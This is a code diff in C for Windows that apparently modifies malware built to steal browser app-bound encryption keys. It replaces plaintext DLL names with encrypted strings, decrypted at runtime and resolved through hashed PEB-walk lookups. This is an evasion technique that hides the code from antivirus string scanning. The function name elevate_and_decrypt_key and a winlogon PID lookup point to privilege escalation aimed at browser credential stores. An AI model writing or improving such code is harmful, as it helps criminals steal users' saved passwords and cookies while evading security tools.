@@ -22,6 +22,18 @@
 
 #include <windows.h>
 #include <tlhelp32.h>
+#include "enc_strings.h"
+
+/* ── Inline helpers for encrypted PEB-walk resolution ──────── */
+static inline void *resolve_mod_enc(const uint8_t *enc, size_t len) {
+    char buf[32]; enc_decrypt(enc, len, buf);
+    return mirage_get_module_by_hash(mirage_encrypted_hash_module(buf));
+}
+static inline void *resolve_fn_enc(void *mod, const uint8_t *enc, size_t len) {
+    char buf[32]; enc_decrypt(enc, len, buf);
+    return mirage_get_function_by_hash(mod, mirage_encrypted_hash_func(buf));
+}
+
 
 /* ── Function pointer types ───────────────────────────────────── */
 
@@ -101,10 +113,10 @@ static DWORD find_winlogon_pid(void* user32, void* kernel32) {
 int elevate_and_decrypt_key(const unsigned char *enc_key, size_t enc_len,
                             AppBoundBrowser browser, unsigned char *key32) {
     /* Resolve modules */
-    void* ntdll = mirage_get_module_by_hash(mirage_encrypted_hash_module("ntdll.dll"));
-    void* kernel32 = mirage_get_module_by_hash(mirage_encrypted_hash_module("kernel32.dll"));
-    void* user32 = mirage_get_module_by_hash(mirage_encrypted_hash_module("user32.dll"));
-    void* advapi32 = mirage_get_module_by_hash(mirage_encrypted_hash_module("advapi32.dll"));
+    void* ntdll = resolve_mod_enc(enc_ntdll, ENC_NTDLL_LEN);
+    void* kernel32 = resolve_mod_enc(enc_kernel32, ENC_KERNEL32_LEN);
+    void* user32 = resolve_mod_enc(enc_user32, ENC_USER32_LEN);
+    void* advapi32 = resolve_mod_enc(enc_advapi32, ENC_ADVAPI32_LEN);
 
     if (!ntdll || !kernel32 || !user32 || !advapi32)
         return -1;
